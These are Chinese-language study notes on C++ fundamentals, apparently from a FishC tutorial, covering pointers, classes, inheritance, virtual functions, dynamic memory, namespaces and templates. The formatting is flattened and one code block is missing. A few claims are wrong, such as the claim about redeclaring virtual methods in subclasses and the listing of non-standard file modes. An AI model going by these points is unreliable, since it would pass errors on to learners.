概念：地址是计算机内存中的某个位置，指针是专门用来存放地址的特殊类型变量 形式：type *pointerName; 允许void类型指针 内存：程序在硬盘上以文件的形式存在，但它们的运行在计算机的内存中发生的 对齐：变量类型是根据它们的自然边界进行对齐的。不同操作系统对齐字节不同 文件对齐，内存对齐 程序在编译链接后会被分割成一个一个的区块，而区块在文件和内存中要按照一定的规律来对齐 寻址 通过变量名 通过变量地址 变量的地址在程序执行期间是不会发生变化的 不过，同一个程序不同时间加载到内存中，同一个变量的地址是会改变的 ’&amp;‘ 取址操作符，给变量取别名 123int var = 123;std::cout &lt;&lt;&quot;Address is :&quot; &lt;&lt;&amp;var; 可以把地址赋值给一种称为指针的特殊变量 指针类型必与由它保存其地址的变量的类型一致 ’*‘ 解引用符 c++ 允许指针群 p ，就是多个指针有同样的值 123int*p1=&amp;myInt;int*p2=&amp;myInt; c++支持无类型（void）指针，就是没有被声明为某种特定类型的指针 void*vPointer; reinterpret_cast&lt;type&gt; (expr): reinterpret_cast 运算符把某种指针改为其他类型的指针。它可以把一个指针转换为一个整数，也可以把一个整数转换为一个指针。 数组的名字同时也是一个指向其第一个元素（基地址）的指针。 传值，传址和传引用 在默认情况下，参数只能以值传递的方式给函数 被传递到函数的只是 { 变量的值 }，永远不会是变量本身 如何绕开“传值”？ 传地址 向函数 { 传递变量的地址 } 取代它的值 想要 { 获取某个变量的地址 } 只需要在它前面加“取址符”【&amp;】 注意：如果传的是地址，在函数中必须要通过【*】对指针进行解引用 引用传递 声明时：swap(int &amp;x，int &amp;y); 用函数时：swap(num1，num2); 反汇编 结构 定义结构的语法 12345struct name&#123; type varName1; type varName2;&#125;; 用 “ . &quot; 对结构成员进行赋值 结构与指针 例子 123456789101112struct FishOil&#123; std::string name; std::string id; char sex; //F==Female,M=Male&#125;；//创建一个 FishOil 类型的变量FishOil Jiayu=&#123;&quot;小甲鱼”,&quot;fishc_00000&quot;,&#x27;M&#x27;&#125;//创建一个指向该结构的指针FishOil *pJiayu=&amp;Jiayu;/*注意：因为指针的类型必须与指向的地址的变量的类型一致，所以pJiayu指针的类型也是FishOil */ 通过指针访问结构成员 对指针进行解引用来访问相应的变量值 (*pJiayu).name=&quot;黑夜&quot;; (*pJiayu).id=&quot;fishc_00001&quot;; 用箭头 pJiayu-&gt;name=&quot;黑夜&quot;; pJiayu-&gt;id=&quot;fishc_00001&quot;; 区分&quot;.“与”-&gt;&quot; 把(*pJiayu)当作结构变量时用&quot;.&quot; 把 pJiayu 当作指针时用&quot;-&gt;&quot; 联合，枚举和类型别名 联合（union) 123456789101112union mima&#123; unsigned long birthday; unsigned short ssn; char* pet;&#125;;//创建该类型的变量mima mima_1;//赋值mima_1.birthday=20010101；mima_1.pet=&quot;Chaozai&quot;;//这个联合将把“Chaozai&quot;存入mima_1联合的pet成员，并丢弃birthday成员里的值 联合也可以容纳多种不同类型的值，但是它每次只能存储这些值中的某一个 枚举(enum) 123456//用枚举来创建一个可取值列表enum weekdays&#123; Monday,Tuesday,Wednesday,Thursday,Friday&#125;;//创建变量weekdays today;//赋值today = Thursday; 注意：不用引号，因为枚举值不是字符串 编译器会按照枚举值在定义时出现的先后顺序把它们与0~n-1的整数（n是枚举值的总个数）分别关联起来 优点 它们可以限制变量的可取值 它们可以用作switch条件语句的case标号 类型别名 typedef int* intPointer; Typedef，为一个类型定义别名 函数指针和指针函数 函数指针：指向函数首地址的指针变量称为函数指针 声明 int (*p)( ); 指针函数：一个函数可以带回一个整型数据的值，字符类型值和实型类型的值，还可以带回指针类型的数据，使其指向某个地址单元 面对对象 类和对象 类和对象基础 类描述了一种数据类型的全部属性（包括可使用它执行的操作），对象是根据这些描述创建的实体。 操作文件的对象 ifstream，（input file stream） ifstream in; in.open(&quot;test.txt&quot;); 等价于 ifstream in(&quot;test.txt&quot;); 默认操作为打开 两个参数 ifstream in(char* filename,int open_mode); filename 文件名称，它是一个字符串 open_mode 打开模式，其值用来定义以怎样的方式打开文件 常见的打开模式 ios::in–打开一个可读取文件 ios::out–打开一个可写入文件 ios::binary–以二进制的形式打开一个文件 ios::app–写入的所有数据将被追加到文件的末尾 ios::trunk–删除文件原来已存在的内容 ios::nocreate–如果要打开的文件并不存在，那么以此参数调用open函数将无法进行 ios::noreplace–如果要打开的文件已存在，试图用open函数打开时将返回一个错误 ios::beg–使得文件指针指向文件头 ios::end–使得文件指针指向文件尾 并行操作OR符号 “ | ” ofstream,（output file stream） ofstream in; out.open(&quot;text.txt&quot;); 等价于 ofstream in(&quot;test.txt&quot;); 区分类和结构 对象内部可以有变量和函数 结构通常只由各种变量构成 声明一个类 1234567891011121314151617class Car&#123; public: std::string color; std::string engine; float gas_tank; unsigned int Wheel;void fill_tank(float liter);//方法的声明&#125;;//方法的定义通常安排在类声明的后面void Car::fill_tank(float liter)&#123; gas_tank +=liter;&#125; 注意：类名的第一个字母大写是一种习惯上的标准，但不是硬性规定，在类声明末尾必须有一个分号【;】 类由变量和函数组成，对象将使用那些变量来存储信息，调用那些函数来完成操作 类里的变量成为属性，函数成为方法 作用域解析操作符【::】，作用是告诉编译器这个方法存在于何处，或者说属于哪一个类 定义构造器——类的构造函数 面向对象的编程技术开发程序最基本步骤 定义一个由属性和方法的类（模板） 为该类创建一个变量（实现） 区别 构造器的名字必须和它所在的类的名字一样 系统在创建某个类的实例时会第一时间自动调用这个类的构造器 构造器永远不会返回任何值，并且构造函数没有声明类型 创建构造器，需要先把它的声明添加到类里： 1234567891011class Car&#123; Car(void);&#125;//注意大小写与类名保持一致。在结束声明之后开始定义构造器本身Car::Car(void) //不用写void Car::Car(void)&#123; color = &quot;WHITE&quot;; engine = &quot;V8&quot;; wheel = 4; gas_tank = FULL_GAS;&#125; 构造对象数组：数组可以是任何一种数据类型 1234Car mycar[10];//调用语法mycar[x].running;//注：x代表着给定数组元素的下标 每个类至少有一个构造器，如果你没有在类里定义一个构造器，编译器就会替你定义一个没有代码内容的空构造器：ClassName::ClassName()&#123;&#125; 除此之外编译器还会替你创建一个副本构造器。 定义析构器——类的析构函数 析构器：在销毁一个对象时，系统会调用析构器来达到效果 12345class Car&#123; Car(void); ~Car();&#125; 构造器用来完成事先的初始化和准备工作（申请分配内存），析构器用来完成事后所需的清理工作（清理内存） 特点 析构器也永远不返回任何值 析构器不带任何参数，格式：~ClassName(); 在复杂的类里，析构器往往至关重要（可能引起内存泄漏） 副本构造器 可以把一个对象赋值给一个类型与之相同的变量 编译器将生成必要的代码把“源”对象各属性的值分别赋值给“目标”对象的对应成员。这种赋值行为叫逐位复制 问题：源对象的成员变量是指针，对象成员进行逐位复制的结果是你将拥有两个一摸一样的实例，而这两个副本里的同名指针会指向相同的地址。当删除其中一个对象时，它包含的指针也将被删除，但万一此时另一个副本（对象）还在引用这个指针，就会出现问题！ 1234//例1MyClass obj1;MyClass obj2;obj2=obj1; 解决思路：重载操作符 重载“=“操作符，在其中对指针进行处理 语法：MyClass &amp;operator = (const Myclass &amp;rhs);//这个方法预期的输入参数是一个MyClass类型的、不可改变的引用 因为这里使用的参数是一个引用，所以编译器在传递输入参数时就不会再为它创建另外一个副本（否则可能导致无限递归） 返回一个引用，该引用指向一个MyClass类的对象，这样做的好处时方便我们把一组赋值语句串联起来，如a=b=c； 例2 MyClass obj1; MyClass obj2=obj1; &lt;!--code￼20--&gt; 在程序中，调用其函数时，该函数在编译时被替代，而不像一般函数那样是在运行时被调用 类模板和函数模板的创建过程几乎没什么区别 把相关代码放在一起，这条规则同样适用于类模板 不管是什么模板，编译器都必须看到全部的代码才能为一种给定的类型创建出一个新的实现来 在创建类模板时，避免类声明和类定义相分离的一个好办法是使用内联方法 在类里，内联方法的基本含义是在声明该方法的同时还对它进行定义 语法 使用内联模板的好处：让程序员少打字并让源代码的可读性变得更好 使用Stack模板前，一定要给它添加一个副本构造器和一个赋值操作符重载 因为代码缺少错误处理功能，例如在栈满时调用 push() 方法，或者在栈为空的时候调用 pop() 方法，会导致程序运行出错 在C++里可以使用多个类型占位符，如果类模板需要一种以上的类型，根据具体情况多使用几个占位符即可 this指针 this指针是类的一个自动生成、自动隐藏的私有成员，它存在于类的非静态成员函数中，指向被调用函数所在对象的地址 例子 1234567class Human&#123; char fishc; Human(char fishc);&#125;;Human::Human(char fishc)&#123; fishc = fishc;&#125;; this指向当前类的属性 改为this-&gt;fishc = fishc; //左边为当前对象的fishc属性，右边为构造器的传入来的fishc参数 注意：使用this指针的基本原则，如果代码不存在二义性，就不用this指针 静态属性和静态方法 面对对象编程技术的一个重要特征是用一个对象把数据和对数据处理的方法封装在一起 如果我们所需的功能或数据不属于某个特征的对象，而是属于整个类的，该怎么办？ c++允许我们把一个或多个成员声明为属于某个类，而不是仅属于该类的对象。 好处 程序员可以在没有创建任何对象的情况下调用有关的方法 能够让有关的数据仍在该类的所有对象间共享 创建一个静态属性和静态方法： 只需要在它的声明前加上static保留字即可 static 隐藏：static作为函数的前缀时，可以对其它源文件隐藏该函数 保持变量内容持久：存储在静态数据区的变量会在程序刚开始运行时就完成初始化，也就是唯一的一次初始化。共有两种变量存储在静态存储区：全局变量和static变量，与全局变量比起来，static可以控制变量的可见范围，说起来还是隐藏 默认初始化为0，全局变量和static定义的变量都有这个作用 静态方法与this指针的关系 this指针是类的一个自动生成、自动隐藏的私有成员，它存在于类的非静态成员函数中，指向被调用函数所在对象的地址 在任何一个方法里都可以使用this指针。从本质上讲，c++ 中的对象其实是一种特殊的结构–出了变量，还包含着一些函数的特殊结构 在程序运行时，对象的属性（变量）和方法（函数）都是保存在内存里，这就意味着它们各自都有与之箱关联的地址 这些地址都可以通过指针来访问，而this指针时保存着对象本身的地址 因为静态方法不是属于某个特定的对象，而是由全体对象共享的，这就意味着它们无法访问this指针。所以，我们才无法在静态方法里访问非静态的类成员 在使用静态属性时，不要忘记为它们分配内存。只要在类声明的外部对静态属性做出声明（就像声明一个变量一样） 调用：ClassName::methodName(); 继承 类的继承 运用：可以创建一个类的堆叠层次结构，每个子类均将继承它的积累里定义的方法和属性。简单说，通过继承机制，可以对现有的代码进行扩展，并应用在新的程序中 基类：可以派生出其它的类，也称为父类或超类。 子类：子类是从基类派生出来的类。 方法-&gt;动作，属性-&gt;状态 例子 class SubClass:public SuperClass&#123;...&#125; class Pig:public Animal&#123;...&#125; 继承机制中的构造器和解析器 构造器带着输入参数 1234567891011121314151617//声明class Animal&#123;public: Animal(std::string theName); std::string name;&#125;class Pig:public Animal&#123;public: Pig(std::string theName);&#125;//方法定义Animal::Animal(std::string theName)&#123; name = theName;&#125;Pig::Pig(std::string theName):Animal(theName)&#123;&#125; 子类的构造器定义里的:Animal(theName)语法含义是： 当调用Pig（）构造器时（以 theName 作为输入参数），Animal（）构造器也将被调用（theName 输入参数将传递给它） 当我们调用Pig pig(“小猪猪”);将把字符串&quot;小猪猪&quot;传递给Pig()和Animal()，赋值动作将实际发生在Animal（）方法里 基类的构造器在使用子类构造器之前被调用 与基类构造器相反，基类的析构器将在子类的最后一条语句执行完毕后才被调用。 注意 初学者常犯的一个错误是用一个毫不相干的类去派生另一个毫不相干的子类 基本原则：基类和子类之间的关系应该自然和清晰 构造器的设计越简明越好！我们应该只用它来初始化各种有关的属性 基本原则：在设计、定义和使用一个类的时候，应该让它的每个组成部分简单到不能再简单 析构器的基本用途是对前面所做的事情进行清理 关于从基类继承来的方法和属性的保护：-class Pig : public Animal {…} c++不仅允许对类里定义的方法和属性实施访问控制，还允许控制子类可以访问基类里的哪些方法和属性 public 是在告诉编译器：继承的方法和属性的访问级别不发生变化——即public仍可以被所有代码访问，protected只能由基类的子类访问，private只能由基类本身访问 protected 把基类的访问级别改为protected，如果原来是public的话，这将使得这个子类外部的代码无法通过子类去访问基类中的public private 是在告诉编译器从基类继承来的每一个成员都当成private来对待，这意味着只有这个子类可以使用它从基类继承来的元素 覆盖方法 例如当我们需要在基类里提供一个通用的函数，但在它的某个子类里需要修改这个方法的实现，在c++中，覆盖（overriding）就可以做到 语法：在子类中声明并定义一个与基类中同名的成员 重载方法 重载机制使你可以定义多个同名的方法（函数），只是它们的输入参数必须不同 注意： 对方法（函数）进行重载一定要有的放矢，重载的方法（函数）越多，程序就越不容易看懂 在对方法进行覆盖（注意区分覆盖和重载）时一定要看仔细，因为只要声明的输入参数和返回值与原来不一致，你编写出来的就将是一个重载方法而不是覆盖方法。而且这种错误往往很难调试 对从基类继承来的方法进行重载，程序永远不会像你预期的那样工作 重载 函数的重载 定义：使用同样的函数名，定义一个有着不同参数，但有着同样用途的函数。可以时参数个数的不同，也可以是参数数据类型的不同 注意 对函数（方法）进行重载一定要谨慎 重载越多，程序越不容易看懂 注意区分重载和覆盖 我们只能通过不同参数进行重载，但不能通过不同的返回值重载（尽管后者也是一种区别 重载的目的：方便对不同数据类型进行同样的处理 运算符重载 运算符重载的方法是定义一个重载运算符的函数，在需要执行被重载的运算符时，系统就会自动调用该函数，以实现相应的算法 运算符重载是通过定义函数实现的，运算符重载实际上是函数的重载 重载规则 c不允许用户自己定义新的运算符，只能对已有的c运算符进行重载 除了一下五个运算符不允许重载外，其它运算符允许重载 【.】成员访问运算符 【.*】成员指针访问运算符 【::】域运算符 【sizeof】尺寸运算符 【?:】条件运算符 重载不能改变运算符运算对象（操作数）个数 重载不能改变运算符的优先级别 重载不能改变运算符的结合性 重载运算符的函数不能有默认的参数 重载的运算符必须和用户定义的自定义类型的对象一起使用，其参数至少应该有一个是类对象或类对象的引用。（也就是说，参数不能全部是c++标准类型，这样约定是为了防止用户修改用于标准类型结构的运算符性质） 运算符重载函数作为类友元函数 目的：为了访问类的私有成员 由于友元的使用会破坏类的封装，因此从原则上说，要尽量将运算符作为成员函数 重载运算符目的：让代码更容易阅读和理解 重载的运算符是带有特殊名称的函数，函数名是由关键字 operator 和其后要重载的运算符符号构成的。Box operator+(const Box&amp;); 重载&lt;&lt;操作符 &lt;&lt; 插入器 operator&lt;&lt;()函数的原型 std::ostream&amp;operator&lt;&lt;(std::ostream&amp; os , Rational f ); 第一个输入参数os是将要向他写数据的那个流，它是以“引用传递”方式传递的 第二个输入参数是打算写道那个流里的数据值，不同的operator&lt;&lt;()重载函数就是因为这个输入参数才相互区别的 返回类型是ostream流的引用。一般来说，在调用operator&lt;&lt;()重载函数时传递给它的是哪一个流，它返回的就应该是那个流的一个引用 多继承（multiple inheritance) 什么时候用多继承？ 遇到的问题无法只用一个”是一个“关系描述的时候，就要用多继承 基本语法：class TeachingStudent : public Student,public Teacher&#123;...&#125; 多态 多态性 多态性：指用一个名字定义不同的函数，调用同一个名字的函数，却执行不同的操作，从而实现“一个接口，多种方法” 多态是如何实现绑定的？ 编译时的多态性：通过重载实现 编译时多态的特点是运行速度快 运行时的多态：通过虚函数实现 运行时多态的特点是高度灵活和抽象 虚方法(虚函数) 指针（以前的做法）：创建一个变量，再把这个变量的地址赋值给一个指针。 问题：使用指向对象的指针 直接创建一个指针并让它指向新分配的内存块 1234int *pointer = new int;*pointer= 110;std :: cout &lt;&lt; *pointer;delete pointer; 虚函数声明：只要在其原型前加上 virtual 保留字即可【virtual void play();】 虚函数：在派生类中重新定义基类中定义的虚函数时，会告诉编译器不要静态链接到该函数。 我们想要的是在程序中任意点可以根据所调用的对象类型来选择调用的函数，这种操作被称为动态链接，或后期绑定。 注意：虚方法是继承的，一旦在基类里把某个方法声明为虚方法，在子类里就不可能再把它声明为一个虚方法了 技巧 如果拿不准要不要把某个方法声明为虚方法，那么就把它声明为虚方法 在基类里把所有的方法都声明为虚方法会让最终生成的可执行代码的速度慢一些，但好处是可以一劳永逸地确保程序的行为符合你的预期 在实现一个多层次的类继承关系的时候，最顶级的基类应该只有虚方法 析构器都是虚方法是为了当一个基类的指针删除一个派生类的对象时，派生类的析构函数可以被正确调用 当类里有虚函数的时候，编译器会给类添加一个虚函数表，里面存放着虚函数指针。为了节省资源，只有当一个类被用来作为基类的时候，我们才把析构函数写成虚函数 虚继承（virtual inheritance） 通过虚继承某个基类，就是在告诉编译器：从当前这个类再派生出来的子类只能拥有那个基类的一个实例 虚继承语法：class Teacher:virtual public Person&#123;...&#125; 抽象方法 抽象方法：把某个方法声明为一个抽象方法等于告诉编译器，这个方法必不可少，但我现在（在这个基类里）还不能为它提供一个实现 纯虚函数：【virtual void funtion1()=0;】 纯虚函数一定没有定义，纯虚函数用来规范派生类的行为，即接口。包含纯虚函数的类是抽象类，抽象类不能定义实例，但可以声明指向实现该抽象类的具体类的指针或引用。 C++高级教程 链接和作用域 链接，当同时编译多个文件时： g++ -o test main.cpp rational.cpp 每个源文件都被称为一个翻译单元（translation unit），在某一个翻译单元里定义的东西在另一个翻译单元里使用正是链接发挥作用的地方 存储类（storage class） 每个变量都有一个存储类，它决定着程序将把变量的值存储在计算上的哪个地方、如何存储，以及变量应该有着怎样的作用域 分类 默认的存储类是auto（自动） 自动变量储存称为栈（stack）的临时内存里并有着最小的作用域，当程序执行到语句块或函数末尾的有花括号时，它门将被系统回收（栈回收），不复存在 static 变量在程序的生命期内将一直保有它的值不会消亡，存储在静态存储区，生命周期为从申请到程序退出（和全局变量一样） 一个static 变量可以有external或internal链接 extern 它在有多个翻译单元时非常重要。它用来把另一个翻译单元里的某个变量声明为本翻译单元里的一个同名全局变量 编译器不会为extern变量分配内存，因为它在其它的地方已经分配过内存 register 它要求编译器把一个变量存储在CPU的寄存器里，但有着与自动变量相同的作用域 register变量存储速度最快 用编译器建立程序 1、执行预处理器指令 把#include指令替换为相应的头文件里的代码 2、把 .cpp文件编译成 .o文件 把C++代码转换为一个编译目标文件，在这一步骤里，编译器将为文件里的变量分配必要的内存并进行各种错误检查 3、把 .o文件链接成一个可执行文件 如果只有一个C++源文件，步骤三只是增加一些标准库代码和生成一个可执行文件 但当同时编译多个源文件来生成一个可执行文件的时候，在编译好每一个组件之后，编译器还需要把它们链接在一起次才能生成最终的可执行文件 问题：当一个编译好的对象（即翻译单元）引用一个肯能不存在于另一个翻译单元里的东西时，潜在的混乱就开始出现了 链接分三种情况，凡是有名字的东西（函数，类，常量，变量，模板，命名空间）必然属于其中之一：外链接（external），内链接（internal)和无链接（none) 外链接：每个翻译单元都可以访问这个东西（前提时只要它知道这个东西存在）。普通的函数，变量，模板和命名空间都有外链接 内链接：在某个翻译单元里定义的东西只能在翻译单元里使用，在任何函数以外定义的静态变量都有内链接 无链接：在函数里定义的变量只存在于该函数的内部，根本没有任何链接 容器和算法 在C++标准库里面有许多现成的容器，它们都经过了老一辈精心设计和测试，可以直接拿来用 C++标准库提供的向量（vector）类型从根本上解决了数组先天不足的问题 std::vector&lt;type&gt;vectorName; 向量容器：向量可以动态地随着添加元素而无限增大（前提是有足够的可用内存） 可以用它的size（）方法查知向量的当前长度（它包含的元素个数） 用push_back()方法来添加元素 还可以用访问数组元素的语法来访问某个给定向量里的元素 迭代器 遍历向量允许使用下标访问符来访问它的各个元素：nemes[x] 迭代器也可以遍历容器里的各个元素 迭代器是一种功能非常有限却很实用的函数，提供一些基本操作符：*、++、==、!=、= 迭代器是个智能指针，具有遍历复杂数据结构的能力，每种容器都支持 通过使用迭代器，当在程序里改用另一种容器的时候就不用修改那么多代码了 每种容器都必须提供自己的迭代器，事实上每种容器都将其迭代器以嵌套的方式定义于内部 因此各种迭代器的接口相同，型号却不同，这就是所谓泛型程序设计的概念：所有操作行为都使用相同接口，虽然它们的具体实现不同 好处：迭代器可以和所有的容器配合使用，而使用迭代器去访问容器元素的算法可以和任何一种容器配合使用 错误处理及调试 编译时错误 培养并保持一种编程风格 认真对待编译器给出的错误/警告信息 三思而后行 开始写代码前先画流程图 编译错误不要立刻修改源代码，应该先完整地审阅一遍源代码，再开始纠正错误 注意检查最基本地语法 把可能有问题地代码行改为注释 换一个环境或开发工具 检查自己是否已经把所有必要的头文件全部include进来 留意变量的作用域和命名空间 休息一下 使用调试工具 把调试好的代码另外保存起来并不再改动它，然后把代码划分成各个模块，用它们来搭建新的应用程序。 运行时错误 培养并保持一种良好的编程风格 多用注释，用好注释 注意操作符的优先级 不要忘记对用户输入和文件输入进行合法性检查 不要做任何假设 把程序划分成一些比较小的单元模块来测试 让函数返回错误代码 创建一些测试函数：专门测试某种条件并根据测试结果返回一个代码来表示当前函数的执行状态 climits头文件把每种数据类型的最大值和最小值都分别定义为一个常量供我们比较 ，SHORT_MAX assert函数 专门为调试准备的工具函数，被包含在C语言的assert.h库文件内，包含到C++里用#include assert()函数需要有一个参数，它将测试这个输入参数的真or假状态 assert()可以用在某个程序里的关键假设不成立时立即停止该程序的执行并报错 除了assert（）函数，还可以用cout语句来报告在程序里正在发生的事情 原则：最终用户看到的错误信息应该既专业有清晰，不能轻易中断程序，不能充满技术细节 捕获异常 异常（exception）就是与预期不相符的反常现象 基本使用思路 1.安排一些C++代码（try 语句）去尝试某件事，尤其是那些可能会失败的事 2.如果发生问题，就抛出一个异常（throw语句） 3.在安排一些代码（catch语句）去捕获这个异常并进行相应的处理 基本语法 123456789try&#123; //Do something. //Throw an exception on error.&#125;catch&#123; //Do whatever.&#125; 注意：每条try语句至少要有一条配对的catch语句，必须定义catch语句以便让它接收一个特定类型的参数 C++还允许我们定义多条catch语句，让每条catch语句分别对应着一种可能的异常 catch(int e)&#123;...&#125; catch(bool e)&#123;...&#125; catch(...)&#123;...&#125; 最后一条catch语句可以捕获任何类型的异常 在程序里，我们可以用throw保留字来抛出一个异常：throw1； 在某个try语句块里执行过throw语句，它后面的所有语句（截止到这个try语句块末尾）将永远不会被执行 与使用一个条件语句或return语句相比，采用异常处理机制的好处是它可以把程序的正常功能与逻辑与出错处理部分清晰地划分开来而不是让他们混在一起 定义一个函数时可以明确地表明你想让它抛出哪种类型地异常 type functionName(arguments)throw(type) 如果没有使用这种语法来定义函数，就意味着函数可以抛出任意类型的异常 TIPS 使用异常的基本原则：应该只用它们来处理确实可能不整常的情况 在构造器和析构器里不应该使用异常 如果try语句块无法找到一个与之匹配的 catch 语句块，它抛出的异常将中止程序的执行 在C++标准库里有个名为 exception 的文件，该文件声明了一个 exception 的基类，可以用这个基类来创建个人的子类以管理异常 如此抛出和捕获的是 exception 类或其子类的对象 如果你打算使用对象作为异常，请记住这样一个原则：以“值传递”方式抛出对象，以“引用传递”方式捕获对象 动态内存 动态内存管理 动态内存支持创建和使用种种能够根据具体需要扩大和缩小的数据结构，它们只受限于计算机硬件的内存总量和系统特殊约束 静态内存：变量（包括指针变量）、固定长度的数组、某给定的对象，指内存块的长度在程序编译时被设定为一个固定的值，而这个值无法改变 动态内存是由一些没有名字、只有地址的内存块构成，那些内存块是在【程序运行期间】动态分配的 new int *i = new int; delete i; i = NULL; 从内存池申请一些内存需要用new语句，它将根据你提供的数据类型分配一块大小适当的内存 申请成功，new语句将返回新分配地址块的起始地址 申请失败，new语句将抛出 std::bad_alloc 异常 注意在使用完内存块后，应用 delete语句 把它还给内存池。另外作为一种附加的保险措施，在释放了内存块之后还应该把与之关联的指针设置为 NULL NULL 指针 当把一个指针变量设置为 NULL 时，它的含义是那个指针将不再指向任何东西 new 语句返回的内存块很可能充满“垃圾“数据，所以我们通常先往里面鞋一些东西覆盖，再访问它们，或者在类直接写一个构造器来初始化 原则：每条 new 语句都必须与之配对的 delete语句，没有或者有两个 delete语句都属于编程漏洞 为对象分配内存 为对象分配内存和为各种基本数据类型（int，char，float）分配内存在做法上完全一样 用new向内存池申请内存 用delete来释放内存 注意 把方法声明为虚方法 在重新使用某个指针之前要调用delete语句，如果不这样做，那个指针将得到一个新内存块的地址，而程序将永远也无法释放原先那个内存块，应为它的地址已经被覆盖掉了 delete语句只释放给定指针变量正指向的内存块，不影响这个指针。在执行delete语句之后，那个内存块被释放了，但指针变量还依然健在 动态数组 数组名和下标操作符[ ]的组合可以被替换成一个指向该数组的基地址的指针和对应的指针运算 建立一个动态数组 把一个数组声明传递给 new 语句将使它返回一个该数组基类型的指针 把数组下标操作符和该指针变量的名字搭配使用就可以像对待一个数组那样使用new语句为这个数组那样使用 new 语句为这个数组分配的内存块 删除一个动态数组 用来保存数组地址的变量只是一个简单的指针，所以需要明确地告诉编译器它应该删除一个数组 做法：在delete保留字地后面加上一对方括号：delete[]x; 从函数或方法返回内存 动态内存的另一个常见用途是让函数申请并返回一个指向内存块地指针 基本思路 在函数里调用 new 语句为某种对象或某种基本数据类型分配一块内存，再把那块内存的地址返回给程序的主代码，主代码将使用那块内存并再完成有关操作后立刻释放 变量作用域的概念：函数或方法有它们自己的变量，这些变量只能在这个函数的内部使用，这些变量我们称为局部变量（local variable） 为什么不应该让函数返回一个指向局部变量的指针？ 任何一个函数都不应该把它自己的局部变量则指针作为它的返回值，因为局部变量在栈里，函数结束自动会释放 如果你想让一个函数在不会留下任何隐患的情况下返回一个指针，那它只能是一个动态分配的内存块的基地址 避免内存泄露 编程漏洞被称为内存泄漏（memory leak） new语句所返回的地址时访问这个内存块的唯一线索，同时也是delete语用来把这个内存块归还给内存池的唯一线索 情况一：new的地址值丢失了 12345int *x;x=new int [3000];x=new int [4000];delete[]x;x=NULL; 情况二：用来保存内存块地址的指针变量作用域的问题 12345void foo()&#123; My Class *x; x = new MyClass();&#125; 解决一：在函数返回（结束）前delete x; 解决二：让函数返回内存块的地址 内存作用域 变量都有一个作用域：规定了它们可以在程序的哪些部分使用 全局作用域：把变量定义在函数的外部，它可以整个程序的所有函数里使用 动态内存，没有作用域，一旦被分配，内存块可以在程序的任何地方使用 需要跟踪它们的使用情况，并在不需要用到它们时把它们及时归还给系统 但是用来保存其地址的指针变量是受作用域的影响 命名空间和模块化编程 模块化（modularizat） 把程序划分为多个组成部分 通过把程序代码分散到多个文件里，等编译程序时再把那些文件重新组合在一起实现的 命名空间（namespace） 头文件 借助C++的预编译和编译器的能力，把一个复杂的应用程序划分成多个不同文件，而仍保持它在类和功能上的完整 头文件的基本用途是提供必要的函数声明和类声明 系统头文件：定义系统级功能，要使用这些功能就必须要把相应的头文件包含过来 自定义头文件 #include&quot;fishc.h&quot; 头文件是一些以.h作为扩展名的标准文本文件，一般情况下，都应该把自定义的头文件和其余的程序文件放在同一个子目录里，或者在主程序目录下专门创建一个子文件夹来集中存放它们 用头文件来保存程序的任何一段代码，如函数或类的声明，但一定不要用头文件来保存它的定义（实现） 头文件里应该注释说明：创建日期，文件用途，创建者姓名，最后一次修改日期，有什么限制，前提条件。另外头文件里的每一个类和函数也应该有说明 提示 头文件经典的做法是只保存函数声明、用户自定义类型数据（结构和类）、模板和全局性的常量 头文件应该只包含最必要的代码，比如只声明一个类或只包含一组彼此相关的函数 使用 在创建了头文件后，用双引号引用文件名 #include&quot;fishc.h&quot; 如果没有给出路径名，编译器将到当前子目录以及当前开发环境中的其他逻辑子目录里去寻找头文件 导入头文件可以用相对路径 #include&quot;./fishc.h&quot; 如果头文件位于某个下级子目录里，那么以下级子目录的名字开头 #include &quot;includes/fishc.h&quot; 如果头文件位于某个与当前子目录平行的”兄弟“子目录里 #include &quot;../includes/fishc.h&quot; 创建实现文件 代码模块化规则：接口（函数的原型）和实现（函数体的定义）分开 头文件的重要性不仅体现在它们可以告诉编译器某个类、结构或函数将有怎样的行为，还体现在它们可以把这些消息告诉给程序员。 C++预处理器 #if —如果表达式为真，执行代码 #else —如果前面的 #if 表达式为假，执行代码 #elif —相当于”elseif“ #endif —用来标志一个条件指令的结束 #ifdef —如果本指令所引用的定义已存在，执行代码 #ifndef —如果本指令所引用的定义不存在，执行代码 格式 #if //代码 #endif #ifndef LOVE_FISHC #define LOVE_FISHC #endif 如果 LOVE_FISHC 还没有定义则定义它 命名空间 创建的每一个类、函数和变量都只能在一定的区域内使用 最大的区域是全局作用域，最小的区域是一个代码块 命名空间就是由用户定义的范围，同一个命名空间里的东西只要在这个命名空间有独一无二的名字就行 创建命名空间 12345namespace myNamespace&#123; //全部东西&#125;//注意在最末尾不需要加分号 如果某个东西在命名空间里定义的，程序将不能立刻使用它 意义：把东西放在它们自己的小盒子里，不让他们域可能有着相同名字的其它东西发生冲突 使用命名空间方法 方法一：std::cout&lt;&lt; 方法二：using namespace std; cout&lt;&lt;&quot;&quot;; 方法三：using std::cout; cout&lt;&lt;&quot;&quot;; 注意：using 指令的出现位置决定着从命名空间里提取出来的东西能在哪个作用域内使用 如果 using 放在所有函数前面，它将拥有全局性，如果你把它放在某个函数里，那它将旨在这一个函数里使用 模板 函数模板 模板可以没有任何类型：它们可以处理的数据并不仅限于某种特定的数据类型 当程序需要用到这些函数中的某一个时，编译器将根据即时生成一个能够对特定数据类型进行处理的代码版本 泛型编程技术可以让程序员用一个解决方案解决多个问题 STL库 定义函数模板 12345template&lt;class T&gt;void foo(T param)&#123;//do something&#125; 第一行代码里，在尖括号里有一个class T，用来告诉编译器：字母T将在接下来的函数里代表一种不确定的数据类型 关键字class并不意味着这个是类，只是一种约定俗成的写法 在告诉计算机 T 是一种类型之后，就可以像对待一种普通数据类型那样使用它了 注意： 创建模板时，还可以用template&lt;Typename T&gt;来代替 template&lt;class T&gt;,它们的含义是一样的。 不要把函数模板分成原型和实现两个部分 为了明确表明swap()是一个函数模板，还可以使用swap&lt;int&gt;(i1,i2)语法来调用这个函数，它将明确地告诉编译器它应该使用哪一种类型 如果某个函数对所有数据类型都将进行同样地处理，就应该把它编写成一个模板 如果某个函数对不同的数据类型将进行不同的处理，就应该重载 类模板 先编写一个类的模板，再由编译器在你第一次使用这个模板时生成实际代码 语法 123456template&lt;class T&gt;class MyClass&#123; MyClass(); void swap(T &amp;a,T &amp;b);&#125; 构造器实现 MyClass&lt;T&gt;::MyClass() &#123; //初始化操作 &#125; 应为MyClass是一个类模板，所以不能只写出MyClass::MyClass()，编译器需要知道与MyClass()配合使用的数据类型，必须在尖括号里提供它，因为没有确定的数据类型可以提供，所以使用一个T作为占位符即可 高级强制类型转换 